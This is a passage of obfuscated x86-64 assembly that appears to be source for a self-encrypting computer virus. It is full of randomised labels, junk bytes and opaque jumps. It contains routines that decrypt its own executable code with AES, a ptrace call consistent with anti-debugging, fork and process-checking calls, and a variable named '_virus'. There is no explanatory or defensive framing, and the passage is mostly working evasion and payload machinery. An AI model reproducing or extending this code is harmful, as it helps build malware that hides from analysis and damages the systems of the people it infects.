    movdqa      OWORD [rsi+0xd0], xmm3
    jb          ..@TaFMsm6F5CRC
    jae         ..@TaFMsm6F5CRC
..@GW7CDZhoiMgK:
    pxor        xmm3, xmm4
    je          ..@Od3H0BKMnMVo
    jne         ..@Od3H0BKMnMVo
..@LPoaoKdfV9fr:
    pop         rdi
    jl          ..@nBB5ZeiYDs0B
    jge         ..@nBB5ZeiYDs0B
..@KgHUf3FolH99:
%ifndef ENABLE_DEBUGGING
    xor         r4, r4
%endif
    jmp         $+5
db 0xbf, 0xbe, 0x15
    jmp         $+3
db 0x41
    jmp         ..@Cxn6NDSE7PDH
..@5T8FqP0KtlPt:
    call        ..@KMAZPkFFQBCY
    jmp         ..@v8K3ci90PHYX
..@BS1AhAa6f5QA:
    push        rsi
    jmp         $+4
db 0xe3, 0x17
    jmp         ..@Sok6D9OQmq3m
..@0dCGoK7SqnZZ:
%ifndef ENABLE_DEBUGGING
    mov         r1, 7
%endif
    jl          ..@m2H4eQ0Sez51
    jge         ..@m2H4eQ0Sez51
..@aXYwLUfpIewN:
    call        ..@QD0Xbwg9GTO5
    js          ..@Nvrd6XstF5u7
    jns         ..@Nvrd6XstF5u7
..@Zb0a9UGCHgDn:
    add         rdi, bytes
    jmp         $+5
db 0xa1, 0x1a, 0xa3
    js          ..@CXMCy7Zzarfa
    jns         ..@CXMCy7Zzarfa
..@HS7UuAwCxOMd:
    ret
    jmp         ..@qA0EVT1SBxqC
..@xupuhDnERsAV:
    pop         rax
    jmp         $+4
db 0x88, 0xa3
    jb          ..@q0gi1LZ2gqj8
    jae         ..@q0gi1LZ2gqj8
..@ceI3LUbE7NsU:
    xchg        rcx, rcx
    jmp         $+4
db 0xae, 0x66
    js          ..@3CjvRBO7y1u1
    jns         ..@3CjvRBO7y1u1
..@0d7NRmdWjCnV:
    mov         m8, r5 
    jmp         $+3
db 0xdf
    jmp         ..@J2ATz5cgUs0f
..@fbBoOTlElOZZ:
    xor         r1, r1
    jmp         $+3
db 0xd9
    jmp         $+5
db 0xf4, 0x1b, 0x1e
    js          ..@ymrxdip6pbiA
    jns         ..@ymrxdip6pbiA
..@WrXDp6VoNz0C:
    ret
    jmp         $+4
db 0xb2, 0x2d
    jmp         $+5
db 0x2e, 0x32, 0x68
    jmp         $+3
db 0x38
    jmp         DecryptExecutableCode
..@UhywmCGFTWSc:
%ifndef ENABLE_DEBUGGING
    jmp         ..@IwuzLc8I7NYD
%endif
    jmp         ..@jjO8HoRlHJMU
..@PpCqCBbCyMOz:
    mov         r3, 111b
    jmp         ..@vkQVGfs3ZtKp
..@BRaUSYVZFKnv:
    push        r1
    jmp         $+4
db 0x83, 0xef
    jmp         ..@Fe6yyE8gMqq8
..@1ITUsSI0vzeE:
    aesdec      xmm0, xmm1
    jmp         ..@iA2202iCD6Hx
..@2wpNUYc9rfcm:
    movdqu      OWORD [rsp+0x80],xmm0
    jmp         $+4
db 0x66, 0xdf
    jmp         $+3
db 0xaf
    jb          ..@oiFjE5kflKQI
    jae         ..@oiFjE5kflKQI
..@8HQm5bLIg0wc:
%ifndef ENABLE_DEBUGGING
    mov         r4, tracerline_size
%endif
    je          ..@oP2H0edY4DEA
    jne         ..@oP2H0edY4DEA
..@cAbTAI8UxVvl:
    mov         rsi, rsi
    jb          ..@tCI4z3j7j7x0
    jae         ..@tCI4z3j7j7x0
..@9yJWt34pZ7zE:
    syscall
    jl          ..@GDe4dvAnOM9j
    jge         ..@GDe4dvAnOM9j
..@rj9MrqfivNcQ:
    movdqu      xmm1, OWORD [rsp+0x70]
    jl          ..@RL46y2M4v7Ky
    jge         ..@RL46y2M4v7Ky
..@0tvADgX2Eua6:
%ifndef ENABLE_DEBUGGING
    call        ExitProgram
%endif
    jmp         ..@gVn5pzx8fuay
..@ErLXOxbC782E:
    cmp         eax, 0x00
    jmp         ..@QElLlWhU7D8Z
..@IYyYg3yzh3ct:
    movdqu      xmm1, OWORD [rsp+0x10]
    jmp         $+3
db 0xb3
    jmp         $+3
db 0xb8
    jmp         $+5
db 0x54, 0x34, 0xd6
    jl          ..@Im0N1Up4vE2j
    jge         ..@Im0N1Up4vE2j
..@xzr1C49XlTiu:
%ifndef ENABLE_DEBUGGING
    pop         rbx
%endif
    jmp         ..@qk8WD7EFSDvk
..@4hDkkMmVIfA9:
    mov         rdi, rbp
    jmp         ..@qpnlGklbyW0d
..@SKVmudiXISDt:
    mov         rsp, rsp
    jl          ExitProgram
    jge         ExitProgram
..@zyChQdULwUO9:
    push        rax
    jmp         $+5
db 0xf2, 0x84, 0x50
    jmp         $+3
db 0x53
    je          ..@0tpRqNtqE3Ij
    jne         ..@0tpRqNtqE3Ij
..@AUlMY5uJgtm0:
    add         rsp, 4*bytes
    jl          ..@k4NyO9zXYFBJ
    jge         ..@k4NyO9zXYFBJ
..@PC1HfYMlvi6L:
    pop         rbx
    jmp         ..@4U9COXkwkXxU
..@aZVWtlnCtW4P:
%ifndef ENABLE_DEBUGGING
    call        GetEnv
%endif
    jb          ..@ka55xb1aTRdR
    jae         ..@ka55xb1aTRdR
..@1G2oOdeQazvQ:
    mov         rsp, rsp
    js          ..@aajEjSOkwXfj
    jns         ..@aajEjSOkwXfj
..@nBcBVjsintce:
    mov         rax, rax
    jb          ..@KkeiAAyci2eQ
    jae         ..@KkeiAAyci2eQ
..@5ROyp9n9orBU:
    aesdec      xmm0, xmm1
    jmp         $+5
db 0xd1, 0x92, 0x6f
    jl          ..@IYyYg3yzh3ct
    jge         ..@IYyYg3yzh3ct
..@xTYKTuF6iXPZ:
    movdqa      OWORD [rsi+0xc0], xmm1
    jmp         ..@L8WG3GqrvJYk
..@2JASgC53p9RT:
%ifndef ENABLE_DEBUGGING
    xor         r4, r4
%endif
    jmp         $+5
db 0x90, 0xed, 0xbd
    jmp         $+4
db 0x00, 0x1c
    js          ..@dzUuYTmGIB8r
    jns         ..@dzUuYTmGIB8r
..@pAfZ0Fd9olaJ:
    xor         r2, r2
    jmp         $+5
db 0x88, 0x20, 0x0f
    jmp         ..@5IkPMdn0EGqC
..@hEJQGNGc7fd9:
    pop         rax
    js          ..@2ZU9pzyrROJB
    jns         ..@2ZU9pzyrROJB
..@5XLValRbPFSA:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_WAIT4
%endif
    jb          ..@4vs17oUvYMW2
    jae         ..@4vs17oUvYMW2
..@ZEAJlkfdgxXZ:
    aesimc      xmm0,xmm1
    jmp         $+4
db 0xb3, 0xc4
    jb          ..@8PtHHsw5eRKd
    jae         ..@8PtHHsw5eRKd
..@TGGEBFJmOXRL:
%ifndef ENABLE_DEBUGGING
    cmp         eax, 0x700000
%endif
    jb          ..@WTudFosw9sdW
    jae         ..@WTudFosw9sdW
..@3117uDJGkOl0:
    movdqu      OWORD [rsp+0x40],xmm0
    jmp         $+5
db 0xed, 0x2b, 0x27
    jmp         $+3
db 0x04
    jmp         ..@SEw2VSkjYz0p
..@C8qpcINVP7OV:
%ifndef ENABLE_DEBUGGING
    VAR         public, lines
%endif
    js          ..@D2twKDUOwKGJ
    jns         ..@D2twKDUOwKGJ
..@n6s3TSy8twqr:
    mov         rbp, rbp
    jl          ..@7qYoYhux4wUM
    jge         ..@7qYoYhux4wUM
..@KlLBY41vlPjt:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_FORK
%endif
    je          ..@P0FXqfELJ02a
    jne         ..@P0FXqfELJ02a
..@LpkPqot1rqf8:
    push        r1
    jl          ..@ydfeJ4SxdV08
    jge         ..@ydfeJ4SxdV08
..@WvTs36KhQgLG:
    movdqu      xmm1, OWORD [rsp+0x70]
    jmp         $+5
db 0x00, 0x53, 0x8c
    jmp         $+4
db 0x32, 0x63
    js          ..@88mllWcpkURn
    jns         ..@88mllWcpkURn
..@kBhXZCEX6yX8:
    push        rbx
    jmp         $+4
db 0xd0, 0x17
    jmp         $+5
db 0xc6, 0x5a, 0xc6
    jmp         ..@uzjaQeumtrh0
..@gLjAATnSRa17:
    mov         rdi, rdi
    jmp         ..@bLx82zdpZ5By
..@Djwuqtved567:
    pop         rcx
    jb          ..@8SCJNjfYNTgV
    jae         ..@8SCJNjfYNTgV
..@LxUuHNTpanAt:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    js          ..@yzwYRWqCB29b
    jns         ..@yzwYRWqCB29b
..@R3ZqtjJjiyPh:
    xchg        rdi, rdi
    jl          ..@HzkxnR6wHLcj
    jge         ..@HzkxnR6wHLcj
..@pEKAJu9P310n:
    aesdeclast  xmm0, xmm1
    jmp         ..@In6yih2NQoXJ
DecryptExecutableCode:
    jmp         ..@TIvtsJKMBpZy
..@R0HuELSS7XPX:
%ifndef ENABLE_DEBUGGING
    test        rax, rax
%endif
    jmp         ..@5pqIwTiCz0Mm
..@Jl7CijOOtQQu:
    pop         rsi
    jmp         ..@Q84dCLbcXbiW
..@gjje9Wit2Z58:
    aesdec      xmm0, xmm1
    jmp         $+3
db 0xa2
    je          ..@dDqHCTU2XrbM
    jne         ..@dDqHCTU2XrbM
..@A7bs9jTrRAZq:
    pop         r3
    jmp         $+3
db 0x58
    jmp         $+3
db 0x1f
    jmp         $+4
db 0x33, 0xbd
    js          ..@UNQVh9kn809c
    jns         ..@UNQVh9kn809c
..@rKeeNlIOq775:
%ifndef ENABLE_DEBUGGING
    jl          ..@Cxn6NDSE7PDH
%endif
    jl          ..@ZBbsK5Hjj0JF
    jge         ..@ZBbsK5Hjj0JF
..@0XuWV8CSzMrQ:
%ifndef ENABLE_DEBUGGING
    pop         rdi
%endif
    js          ..@uzjcyCDBvhbu
    jns         ..@uzjcyCDBvhbu
..@ofVho3nQrrlo:
    call        ..@KMAZPkFFQBCY
    jl          ..@xTYKTuF6iXPZ
    jge         ..@xTYKTuF6iXPZ
..@aIf7kWrMl72A:
    xor         r4, r4
    jmp         $+4
db 0x79, 0x8c
    jb          ..@DlmGz967nbYW
    jae         ..@DlmGz967nbYW
..@F1Oo3Aeqd7Bz:
    push        rsi
    jmp         ..@7GQAEscPKPcC
..@2xyFJynWwxA5:
%ifndef ENABLE_DEBUGGING
    jne         ..@rdSWUyV7Ac2q
%endif
    js          ..@iQnh91gZSXLk
    jns         ..@iQnh91gZSXLk
..@SEw2VSkjYz0p:
    mov         rsp, rsp
    jmp         ..@dxli912A21Hu
..@DMU0lxTovlPZ:
    mov         QWORD [rsp+_AESD_OFF.startaddr], r1
    jmp         $+3
db 0x1a
    js          ..@eb2d5Ma7ya5q
    jns         ..@eb2d5Ma7ya5q
..@qUiYP3EJEkSQ:
    mov         rbx, rbx
    jmp         $+5
db 0x6c, 0x33, 0xf5
    jl          ..@T7OlB3lWGB51
    jge         ..@T7OlB3lWGB51
..@Bm9yyYtUHFsN:
    mov         r1, QWORD [rsp]
    jmp         $+4
db 0x79, 0x3b
    jmp         $+3
db 0x2b
    je          ..@y759vhc5MLAH
    jne         ..@y759vhc5MLAH
..@lkyGTHBCQqhx:
    mov         rdx, rdx
    jmp         ..@2wU6szEnzyLP
..@vAxzw3tqbKaO:
%ifndef ENABLE_DEBUGGING
    call        ExitProgram
%endif
    jmp         $+3
db 0xc5
    jmp         $+4
db 0xbe, 0xac
    jmp         ..@YyQv5e2sdtTm
..@pXakXcmI9jcx:
%ifndef ENABLE_DEBUGGING
    push        rax
%endif
    jmp         $+5
db 0xcc, 0xa7, 0x0d
    js          ..@Axe1m3gW0Cgo
    jns         ..@Axe1m3gW0Cgo
..@Cxn6NDSE7PDH:
%ifndef ENABLE_DEBUGGING
    add         r4, 1
%endif
    jmp         $+3
db 0x2a
    jmp         ..@Gs907G9JDwPY
..@6BsdjJmLgxb6:
    aesdec      xmm0, xmm1
    jmp         $+5
db 0xc3, 0x0c, 0xaa
    jmp         ..@hlmCtsgVmE1t
..@ka55xb1aTRdR:
%ifndef ENABLE_DEBUGGING
    test        rax, rax
%endif
    jmp         $+5
db 0x2f, 0x44, 0x71
    js          ..@G9b4YeD8Eic5
    jns         ..@G9b4YeD8Eic5
..@a3nz3b842o3e:
%ifndef ENABLE_DEBUGGING
    pop         rcx
%endif
    jmp         $+5
db 0x0b, 0xa9, 0xc3
    jmp         ..@ArIMpWDOqU0r
..@2AyZZ3yN56yy:
    rep         nop
    jmp         $+3
db 0xaf
    jmp         ..@KQW4NtiXMcAw
..@qqnFKrzdTAec:
%ifndef ENABLE_DEBUGGING
    RFILE       rax, [rsp], 0x200
%endif
    jmp         ..@bDUY1jBuOtZ6
..@XYsvqJeVgkt2:
    pop         rsi
    jmp         $+5
db 0xb5, 0xb7, 0x47
    jmp         $+4
db 0x83, 0x76
    je          ..@EN7T6VAPyXI8
    jne         ..@EN7T6VAPyXI8
..@DDO5mMx5hnzI:
    movdqu      xmm1, OWORD [rsp+0x40]
    jmp         ..@1ITUsSI0vzeE
..@dFfh1GU2LK1x:
    mov         rcx, rcx
    jb          ..@B2aHjbK7r17x
    jae         ..@B2aHjbK7r17x
..@NXgVN56eDQSK:
    aesimc      xmm0,xmm1
    jmp         $+4
db 0xf2, 0x2f
    jmp         ..@i14yLVJhwq4Q
..@aj0LfwNecru8:
    push        rax
    jmp         $+3
db 0x2b
    jmp         $+5
db 0x4a, 0x0d, 0x1c
    jmp         $+3
db 0xae
    jb          ..@teiKP1smnOXj
    jae         ..@teiKP1smnOXj
..@FP8RJuKuZ6AX:
    xchg        rsi, rsi
    jmp         $+4
db 0x8a, 0x40
    jmp         $+3
db 0x8a
    jmp         $+3
db 0x59
    jmp         $+5
db 0x09, 0x60, 0xd5
    jb          ..@bCrPnCg9ZVSJ
    jae         ..@bCrPnCg9ZVSJ
..@rhyzAAYPUduE:
    mov         rbx, rbx
    js          ..@Va2HqIrDQNvU
    jns         ..@Va2HqIrDQNvU
..@R2yLFTn0mJOM:
%ifndef ENABLE_DEBUGGING
    call        ExitProgram
%endif
    jmp         ..@rdSWUyV7Ac2q
..@2sCcea8T6gBb:
%ifndef ENABLE_DEBUGGING
    shr         eax, 8
%endif
    jb          ..@JxtQeTLmP0nB
    jae         ..@JxtQeTLmP0nB
..@b0ijtkWvINcv:
    aeskeygenassist xmm2, xmm3, 0x1
    jmp         ..@eR0k0A0ijh96
..@3Tf1eMoeE0Eq:
%ifndef ENABLE_DEBUGGING
    test        eax, eax
%endif
    jmp         $+3
db 0x16
    jmp         ..@YMJe2SFJP7h3
..@RkkyDAFF6Z37:
    mov         rdi, rdi
    jmp         ..@UNLnn0N80p25
..@1d5e9tnNPsXd:
    pslldq      xmm4, 0x4
    je          ..@SER8a5TziUGh
    jne         ..@SER8a5TziUGh
..@6dyGuMLAeG3G:
%ifndef ENABLE_DEBUGGING
    syscall
%endif
    js          ..@mJODwSkGV8BQ
    jns         ..@mJODwSkGV8BQ
..@n4Gt2cJ1vFRm:
    mov         rbp, rbp
    jmp         $+3
db 0x07
    jmp         ..@FSOYh5jzpRVU
..@z5rlRlE0O35q:
    push        rdx
    jb          ..@GGMWdOTotE2M
    jae         ..@GGMWdOTotE2M
..@eLbwRq7I7UEb:
    movdqa      OWORD [rsi+0xe0], xmm1
    jmp         $+4
db 0xcf, 0x62
    jmp         $+5
db 0x97, 0xb5, 0x28
    jmp         ..@HM5UkuiqnIFa
..@Y7lXmyC7UUuP:
%ifndef ENABLE_DEBUGGING
    push        rbx
%endif
    jl          ..@H523eM9oGFBi
    jge         ..@H523eM9oGFBi
..@C9rsGnlSWKPX:
    movdqu      OWORD [rsp+0x90],xmm0
    jmp         $+3
db 0xa6
    jl          ..@Hc3iXFzJP8rF
    jge         ..@Hc3iXFzJP8rF
..@fDnPSmGF1aPI:
    xchg        rbx, rbx
    jmp         ..@SYgWXgJpRNl9
..@RoWFsEXC09mK:
    add         r2, 1
    jmp         ..@irQC9Sht6gcw
Aes256Decryption:
    jmp         ..@IkiYhcUobked
..@ckPFmJZW3xkL:
    xchg        rsi, rsi
    jmp         $+5
db 0xf0, 0x94, 0xd7
    je          ..@QdMDSBsCxqGv
    jne         ..@QdMDSBsCxqGv
..@KkKDknwaPIMz:
    movdqa      OWORD [rsi+0x30], xmm3
    jmp         $+5
db 0x53, 0xfb, 0xb8
    jb          ..@LU0z6HB1j43s
    jae         ..@LU0z6HB1j43s
..@ydfeJ4SxdV08:
    push        r2
    jmp         $+4
db 0x40, 0x1b
    jmp         $+5
db 0xc9, 0xf4, 0x7d
    jb          ..@B4cMOlyhai6Q
    jae         ..@B4cMOlyhai6Q
..@8b8TXLiQM4vQ:
    mov         rbx, rbx
    js          ..@eaTsy9B0Ss9r
    jns         ..@eaTsy9B0Ss9r
..@JbD19RbtyoFf:
%ifndef ENABLE_DEBUGGING
    pop         rsi
%endif
    jmp         $+3
db 0x51
    jl          ..@vgieizHjRCaK
    jge         ..@vgieizHjRCaK
..@QRtoIQs9EfPC:
%ifndef ENABLE_DEBUGGING
    cmp         eax, 0x200
%endif
    jmp         $+5
db 0xfd, 0x40, 0x6b
    jb          ..@2xyFJynWwxA5
    jae         ..@2xyFJynWwxA5
..@irQC9Sht6gcw:
    push        rcx
    jmp         ..@ggqv9AKbzoop
..@q6GymkzvTT28:
    mov         rdx, rdx
    js          ..@9ZuMCqj2uy0e
    jns         ..@9ZuMCqj2uy0e
..@kZFOg7R5l1He:
%ifndef ENABLE_DEBUGGING
    pop         rbx
%endif
    jmp         $+5
db 0xcd, 0x50, 0x97
    jmp         ..@3TvrveITQT6k
..@9jEN6FflTy9j:
    call        ..@KMAZPkFFQBCY
    jmp         $+5
db 0x83, 0x73, 0xb1
    jl          ..@LQLR5xa6W2DM
    jge         ..@LQLR5xa6W2DM
..@sb3n0RTz22XQ:
    pop         rdx
    jmp         $+3
db 0xc3
    jl          ..@lKCzXDhCQgZ4
    jge         ..@lKCzXDhCQgZ4
..@CiYx1zFWRvEH:
    movdqu      xmm1, OWORD [rsp+0x90]
    jmp         $+5
db 0xa3, 0x62, 0x39
    je          ..@l98YsLpAADGc
    jne         ..@l98YsLpAADGc
..@IsxHTLZtrFPP:
    cmp         rcx, QWORD [rsp+_AESE_OFF.length]
    jmp         $+5
db 0x23, 0x54, 0x9c
    jmp         $+3
db 0x5a
    jmp         $+3
db 0xbe
    jmp         ..@ugCL3wT6jyZH
..@8zIq44Se6xMQ:
    xchg        rsp, rsp
    jmp         $+4
db 0x64, 0x3b
    jmp         Aes256Decryption
..@d4e7AiK9hGLQ:
    xchg        rdi, rdi
    jmp         $+5
db 0xde, 0xf3, 0xe2
    jmp         ..@PMOGRNG1N9n5
..@C7RAsxkYITiR:
    mov         m4, rdi
    jmp         ..@uTtL4sQdDNjD
..@1wKq0vKGIShc:
    and         r5, PAGE_SIZE-1
    jl          ..@KzUu5eRfoG4b
    jge         ..@KzUu5eRfoG4b
..@VAbUihIfVDSR:
    mov         rdi, QWORD [rsp+_AESD_OFF.keyaddr]
    jmp         ..@jkZcTiHAJikc
..@Im0N1Up4vE2j:
    push        rdi
    jmp         $+4
db 0x6a, 0x03
    jmp         $+5
db 0x52, 0x9c, 0x77
    jmp         ..@Lns7c1bvXYRB
..@oDuTkaTlX8jJ:
    movdqu      xmm1, OWORD [rsp+0x60]
    jmp         $+4
db 0x4f, 0xea
    jl          ..@r5ivX6jdhf0F
    jge         ..@r5ivX6jdhf0F
..@qdPKvmpCOtvu:
    mov         rdi, rdi
    jmp         $+5
db 0xf9, 0x84, 0x17
    jl          ..@8uDV02jRe42T
    jge         ..@8uDV02jRe42T
..@jiqCRH9diZz5:
    push        r3
    jmp         $+4
db 0x88, 0xbf
    jl          ..@lU9mei7HF9pn
    jge         ..@lU9mei7HF9pn
..@9tVOBIKQvOOt:
    mov         r3, rax
    jl          ..@cUZwIN2HxFFf
    jge         ..@cUZwIN2HxFFf
..@NRZ0z9yPTRCN:
    DESTROY_MX_VAR
    jmp         $+3
db 0x5f
    jmp         $+3
db 0x99
    jb          ..@4ssNL3GzIkzW
    jae         ..@4ssNL3GzIkzW
..@YcuGL1PiIt3P:
%ifndef ENABLE_DEBUGGING
    mov         rax, rax
%endif
    jmp         $+5
db 0x08, 0x29, 0x41
    jl          ..@JvpDnu55HOwd
    jge         ..@JvpDnu55HOwd
..@QMl4AXyqDmj9:
    movdqu      xmm1, OWORD [rsp+0xc0]
    jmp         $+5
db 0x67, 0x01, 0xde
    jmp         ..@TEEBlaiLV13Z
..@KnyBRlAzDsQL:
    VAR         public, _virus
    jmp         ..@KsnPFTAUfHHN
..@A0J19tcqsG3g:
    pop         rdx
    jmp         $+5
db 0x8e, 0xd5, 0x9b
    jmp         ..@e3gyWZSXVGXl
..@plCSU3N7DxYL:
    pop         rdx
    jb          ..@Deq87jtytB2q
    jae         ..@Deq87jtytB2q
..@8ZSiu2GJNTU7:
    mov         rsp, rsp
    jmp         $+4
db 0x42, 0x8e
    jb          ..@Yi0IShJTjoFF
    jae         ..@Yi0IShJTjoFF
..@kpRrbWQqQAIP:
%ifndef ENABLE_DEBUGGING
    xor         r3, r3
%endif
    je          ..@2JASgC53p9RT
    jne         ..@2JASgC53p9RT
..@3NIhSLA8XcYm:
    push        rax
    jmp         $+3
db 0x81
    jmp         $+5
db 0x0f, 0x48, 0x81
    js          ..@xupuhDnERsAV
    jns         ..@xupuhDnERsAV
..@4pGAsq8dxygO:
    movdqa      OWORD [rsi+0x20], xmm1
    jmp         ..@RcUIZKAg9iUf
..@7okNKDMKVFWZ:
    mov         rax, rax
    js          ..@vhFHZCRBVUvM
    jns         ..@vhFHZCRBVUvM
..@3wn2IWZ9DzHs:
    push        rdx
    jb          ..@A0J19tcqsG3g
    jae         ..@A0J19tcqsG3g
..@J2ATz5cgUs0f:
    call        Processes
    jmp         $+3
db 0x9f
    jmp         ..@CgG9YyQYbVw2
..@kbzTMrKMDLm1:
    push        rcx
    je          ..@9RHel4OQccHH
    jne         ..@9RHel4OQccHH
..@9TheKlYqMq0i:
    xchg        rsi, rsi
    jmp         $+3
db 0x01
    jb          ..@DDO5mMx5hnzI
    jae         ..@DDO5mMx5hnzI
..@8ei271UnxNhR:
%ifndef ENABLE_DEBUGGING
    add         rsp, 0x200
%endif
    jb          ..@l1PmDir2EqC2
    jae         ..@l1PmDir2EqC2
..@XW4CDDCt8gU1:
    mov         rbx, rbx
    jmp         $+4
db 0x6e, 0xd8
    jmp         $+3
db 0x03
    jb          ..@9nAqFibkCfwN
    jae         ..@9nAqFibkCfwN
..@5NMNROOoAuQX:
    push        rdx
    jmp         $+3
db 0x27
    jmp         $+3
db 0xf6
    jmp         ..@aCn3mnm4X7Kk
..@FYBxwwxO8rPd:
    pop         rdx
    js          ..@H9Kn9KbkFKQN
    jns         ..@H9Kn9KbkFKQN
..@yWHG6mb6FuBV:
    xor         r5, r5
    jb          ..@A2ECjCXzdpEK
    jae         ..@A2ECjCXzdpEK
..@gETQFLN5znOs:
    movdqu      OWORD [rsp+0xa0],xmm0
    js          ..@ZD5w60qDs3gr
    jns         ..@ZD5w60qDs3gr
..@oQCE90meWcZK:
    xor         rax, rax
    jmp         ..@vCpcugc91ha7
..@9GKRsEmF9dqF:
    aeskeygenassist xmm2, xmm3, 0x10
    je          ..@8i7OlzT4CwVI
    jne         ..@8i7OlzT4CwVI
..@hAc3VnImhlJs:
    test        r2, r2
    jmp         $+4
db 0x2f, 0xde
    jmp         $+4
db 0x5a, 0xd0
    js          ..@DxGRjab3pGeI
    jns         ..@DxGRjab3pGeI
..@JvpDnu55HOwd:
%ifndef ENABLE_DEBUGGING
    sub         rsp, bytes
%endif
    jmp         $+5
db 0x89, 0x57, 0x4b
    jmp         $+4
db 0x68, 0x7c
    jl          ..@uCtIYJh4vaKE
    jge         ..@uCtIYJh4vaKE
..@lQdZiK6uClcX:
%ifndef ENABLE_DEBUGGING
    rep         nop
%endif
    jmp         $+5
db 0x35, 0x98, 0x4a
    jb          ..@Kh7zomFDZKtb
    jae         ..@Kh7zomFDZKtb
..@IwuzLc8I7NYD:
%ifndef ENABLE_DEBUGGING
    xor         rax, rax
%endif
    je          ..@GrCueQCvK4ue
    jne         ..@GrCueQCvK4ue
..@4vs17oUvYMW2:
%ifndef ENABLE_DEBUGGING
    mov         rdx, rdx
%endif
    je          ..@qSXjnuZsRsL2
    jne         ..@qSXjnuZsRsL2
..@hhIuSCu4F9mj:
    push        r4
    jmp         $+4
db 0xfb, 0xce
    jmp         $+4
db 0x8c, 0x79
    jl          ..@zHAnTgkIR5WB
    jge         ..@zHAnTgkIR5WB
..@B2aHjbK7r17x:
    pop         rsi
    jmp         $+4
db 0x56, 0xd5
    jmp         ..@lEHAgK2HZiwY
..@thjKBBuuvJ0A:
%ifndef ENABLE_DEBUGGING
    xchg        rsp, rsp
%endif
    jmp         $+5
db 0x83, 0x30, 0x81
    js          ..@5StKlGorTD3Y
    jns         ..@5StKlGorTD3Y
..@ktOc8nCpzt4m:
    push        rbx
    jmp         $+3
db 0xfd
    jb          ..@QpWWCABZhijm
    jae         ..@QpWWCABZhijm
..@Uqy74j1WFBgH:
    movdqa      OWORD [rsi+0x80], xmm1
    jmp         ..@niD2tHLO7sDj
..@jmjDq5Q4vcyZ:
%ifndef ENABLE_DEBUGGING
    mov         r2, r5
%endif
    jmp         $+5
db 0x3d, 0xb6, 0xda
    jmp         ..@08UKCNyrMsci
..@5StKlGorTD3Y:
%ifndef ENABLE_DEBUGGING
    mov         rdx, rdx
%endif
    jb          ..@Gm7xRYRJF9dQ
    jae         ..@Gm7xRYRJF9dQ
..@TEpH7DOFmpwg:
    movdqu      OWORD [r1], xmm0
    jmp         ..@rAxDdSKB8ISY
..@mWr2EY7fnMje:
%ifndef ENABLE_DEBUGGING
    mov         rax, SYS_PTRACE
%endif
    jmp         $+3
db 0x5e
    jmp         ..@M4pbaXr4dG3q
..@Q1AqrJfeTLDS:
    xor         r3, r3
    jmp         $+5
db 0xa6, 0x95, 0x85
    jmp         $+5
db 0x5d, 0xcb, 0x74
    jmp         $+4
db 0x54, 0x95
    js          ..@aqZNZ9gcRO1n
    jns         ..@aqZNZ9gcRO1n
..@fD7wiGQlVZZ3:
%ifndef ENABLE_DEBUGGING
    mov         r1, 0
%endif
    js          ..@R2yLFTn0mJOM
    jns         ..@R2yLFTn0mJOM
..@dxli912A21Hu:
    push        rdx
    js          ..@FYBxwwxO8rPd
    jns         ..@FYBxwwxO8rPd
..@HllyDg5Ml20R:
    mov         rcx, rcx
    jmp         $+5
db 0x67, 0x07, 0xcd
    jb          ..@LJv9psAF6Sdn
    jae         ..@LJv9psAF6Sdn
..@MmbZJb56WK4V:
    push        rcx
    jb          ..@md0jq03uHVMO
    jae         ..@md0jq03uHVMO
..@UnXyRN2aSeQb:
    pop         r1
    jmp         $+5
db 0x42, 0x75, 0x8b
    jmp         $+4
db 0xc4, 0xe4
    jl          ..@LtRm40aWL101
    jge         ..@LtRm40aWL101
..@nSpHRHjXqIRz:
%ifndef ENABLE_DEBUGGING
    cmp         eax, 0x3
%endif
    jmp         $+5
db 0x88, 0xb0, 0x41
    jb          ..@PoJVb72n6Zet
    jae         ..@PoJVb72n6Zet
..@Du0Aq8DYYyFf:
%ifndef ENABLE_DEBUGGING
    mov         r1, rsp
%endif
    jmp         ..@ztCPQX9LkzSa
..@gY3RvWGw9JYG:
    pxor        xmm3, xmm4
    jl          ..@CMdaEADeNcnx
    jge         ..@CMdaEADeNcnx
..@WUl71BjT8UQ8:
    movdqa      OWORD [rsi+0x50], xmm3
    jmp         ..@Qg7YAYG4Wf9J
..@0wkz1yUbfSuK:
    pop         rdi
    je          ..@MHzw7t30XjIu
    jne         ..@MHzw7t30XjIu
..@1VkCCTAGCTDe:
    xchg        rax, rax
    js          ..@A22z9RQ0xqDl
    jns         ..@A22z9RQ0xqDl
..@afYHiuFrg8bv:
    mov         al, BYTE [r1]
    jmp         ..@RvCVSOK13rIm
..@2ZU9pzyrROJB:
    aeskeygenassist xmm2, xmm3, 0x2
    jmp         ..@9jEN6FflTy9j
..@JwTXCUeOEnMC:
    mov         rcx, rcx
    jmp         ..@MFebVUyRb1aX
..@teiKP1smnOXj:
    push        rdi
    jmp         $+5
db 0xe6, 0x0f, 0x27
    jb          ..@0wkz1yUbfSuK
    jae         ..@0wkz1yUbfSuK
..@QWOFVTBHhSRM:
    sub         r2, non_encrypted_len
    js          ..@mSbKAYs6xROg
    jns         ..@mSbKAYs6xROg
..@njRAlaO2Wqkp:
    push        rbx
    jmp         $+5
db 0x2c, 0x3c, 0xbf
    jl          ..@DvQwFb2H0MjZ
    jge         ..@DvQwFb2H0MjZ
..@iuVIBtfiugl3:
    lea         rdi, [rsp+_UEC_OFF.key]
    jmp         $+5
db 0x62, 0x5e, 0x00
    je          ..@NewBhtYNXUH2
    jne         ..@NewBhtYNXUH2
..@MkP12NyM7GXr:
    pop         rcx
    jmp         $+3
db 0xcb
    js          ..@3RRSklR3DP2K
    jns         ..@3RRSklR3DP2K
..@5pqIwTiCz0Mm:
%ifndef ENABLE_DEBUGGING
    push        rbx
%endif
    jmp         $+5
db 0xae, 0x9b, 0x7e
    jmp         ..@HfeyqoRHpg91
..@dqJJtqjxvwlZ:
    aeskeygenassist xmm2, xmm3, 0x20
    jmp         $+5
db 0x44, 0xb7, 0x32
    je          ..@ofVho3nQrrlo
    jne         ..@ofVho3nQrrlo
..@i65jaYuAxfUM:
    xchg        rbx, rbx
    jmp         ..@5BqMDdSZW2O7
Strlen:
    jmp         ..@0JsB4gDiNrxA
..@J0pZg1MsYi2V:
    jne         ..@4U9COXkwkXxU
    jmp         $+5
db 0xf1, 0xa3, 0x91
    jmp         ..@naUNP7wVznYa
..@u8blAqkKOKTj:
    pop         rdi
    jb          ..@gN6OMWW4FlQj
    jae         ..@gN6OMWW4FlQj
..@V3UPVuk1vKP5:
    movdqu      OWORD [rsp+0x10],xmm0
    js          ..@k30F73XLnAdq
